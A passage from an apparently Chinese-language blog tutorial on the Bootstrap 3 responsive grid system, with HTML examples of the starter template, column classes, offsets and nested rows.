code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-栅格系统"><a href="#2-栅格系统" class="headerlink" title="2.栅格系统"></a>2.栅格系统</h2><p>Bootstrap 提供了一套响应式、移动设备优先的流式栅格系统，随着屏幕或视口（viewport）尺寸的增加，系统会自动分为最多12列。</p><h3 id="2-1-栅格参数"><a href="#2-1-栅格参数" class="headerlink" title="2.1 栅格参数"></a>2.1 栅格参数</h3><p>Bootstrap 的栅格系统是在多种屏幕设备上工作。</p><table><thead><tr><th align="left"></th><th align="left">超小屏幕 手机 (&lt;768px)</th><th align="left">小屏幕 平板 (≥768px)</th><th align="left">中等屏幕 桌面显示器 (≥992px)</th><th align="left">大屏幕 大桌面显示器 (≥1200px)</th></tr></thead><tbody><tr><td align="left">栅格系统行为</td><td align="left">总是水平排列</td><td align="left">开始是堆叠在一起的，当大于这些阈值时将变为水平排列C</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>.container</code> 最大宽度</td><td align="left">None （自动）</td><td align="left">750px</td><td align="left">970px</td><td align="left">1170px</td></tr><tr><td align="left">类前缀</td><td align="left"><code>.col-xs-</code></td><td align="left"><code>.col-sm-</code></td><td align="left"><code>.col-md-</code></td><td align="left"><code>.col-lg-</code></td></tr><tr><td align="left">列（column）数</td><td align="left">12</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">最大列（column）宽</td><td align="left">自动</td><td align="left">~62px</td><td align="left">~81px</td><td align="left">~97px</td></tr><tr><td align="left">槽（gutter）宽</td><td align="left">30px （每列左右均有 15px）</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">可嵌套</td><td align="left">是</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">偏移（Offsets）</td><td align="left">是</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">列排序</td><td align="left">是</td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="2-2-实例"><a href="#2-2-实例" class="headerlink" title="2.2 实例"></a>2.2 实例</h3><p>从堆叠到水平排列。注意：** 需要先把下载好的BootStrap中的文件导入。 **</p><p>BootStrap官网模板：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Bootstrap 101 Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Bootstrap --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- HTML5 shim 和 Respond.js 是为了让 IE8 支持 HTML5 元素和媒体查询（media queries）功能 --&gt;</span><br>    <span class="hljs-comment">&lt;!-- 警告：通过 file:// 协议（就是直接将 html 页面拖拽到浏览器中）访问页面时 Respond.js 不起作用 --&gt;</span><br>    <span class="hljs-comment">&lt;!--[if lt IE 9]&gt;</span><br><span class="hljs-comment">      &lt;script src=&quot;https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-comment">      &lt;script src=&quot;https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-comment">    &lt;![endif]--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你好，世界！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- jQuery (Bootstrap 的所有 JavaScript 插件都依赖 jQuery，所以必须放在前边) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>需要注意的是：需要修改一个地方，不然网页没有效果。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">    <span class="hljs-comment">&lt;!-- Bootstrap --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><br>    <br>//即，需要将 integrity中的内容删除<br>  <span class="hljs-comment">&lt;!-- Bootstrap --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>本地完整实现：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Bootstrap Study<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery-3.6.0.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/bootstrap.min.js&quot;</span> <span class="hljs-attr">integrity</span>=<span class="hljs-string">&quot;sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd&quot;</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你好，世界！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-5<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-7<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-9<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-10<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-11<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-1&quot;</span>&gt;</span>.col-md-12<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-8&quot;</span>&gt;</span>.col-md-8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-6&quot;</span>&gt;</span>.col-md-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-6&quot;</span>&gt;</span>.col-md-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>可自行测试查看网页效果。</p><p>根据不同的屏幕大小制定不同的方式：这里的代码只写<code>body</code>中的，<code>head</code>中的可参考上面的代码。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你好，世界！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-12 col-md-8&quot;</span>&gt;</span>.col-xs-12 .col-md-8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6 col-md-4&quot;</span>&gt;</span>.col-xs-6 .col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6 col-md-4&quot;</span>&gt;</span>.col-xs-6 .col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6 col-md-4&quot;</span>&gt;</span>.col-xs-6 .col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6 col-md-4&quot;</span>&gt;</span>.col-xs-6 .col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6&quot;</span>&gt;</span>.col-xs-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6&quot;</span>&gt;</span>.col-xs-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>如果在一个 <code>.row</code> 内包含的列（column）大于12个，多余列（column）的元素将作为一个整体单元被另起一行排列。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-9&quot;</span>&gt;</span>.col-xs-9<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-4&quot;</span>&gt;</span>.col-xs-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <span class="hljs-comment">&lt;!-- 9 + 4 = 13 &gt; 12 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-6&quot;</span>&gt;</span>.col-xs-6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-列偏移"><a href="#2-3-列偏移" class="headerlink" title="2.3 列偏移"></a>2.3 列偏移</h3><p>使用 <code>.col-md-offset-*</code> 类可以将列向右侧偏移。这些类实际是通过使用 <code>*</code> 选择器为当前元素增加了左侧的边距（margin）。例如，<code>.col-md-offset-4</code> 类将 <code>.col-md-4</code> 元素向右侧偏移了4个列（column）的宽度。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-4 col-md-offset-4&quot;</span>&gt;</span>.col-md-4 .col-md-offset-4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-3 col-md-offset-3&quot;</span>&gt;</span>.col-md-3 .col-md-offset-3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-3 col-md-offset-3&quot;</span>&gt;</span>.col-md-3 .col-md-offset-3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-6 col-md-offset-3&quot;</span>&gt;</span>.col-md-6 .col-md-offset-3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-列嵌套"><a href="#2-4-列嵌套" class="headerlink" title="2.4 列嵌套"></a>2.4 列嵌套</h3><p>为了使用内置的栅格系统将内容再次嵌套，可以通过添加一个新的 <code>.row</code> 元素和一系列 <code>.col-sm-*</code> 元素到已经存在的 <code>.col-sm-*</code> 元素内。被嵌套的行（row）所包含的列（column）的个数不能超过12（其实，没有要求你必须占满12列）。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-9&quot;</span>&gt;</span><br>    Level 1: .col-sm-9<br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-8 col-sm-6&quot;</span>&gt;</span><br>        Level 2: .col-xs-8 .col-sm-6<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-xs-4 col-sm-6&quot;</span>&gt;</span><br>        Level 2: .col-xs-4 .col-sm-6<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span 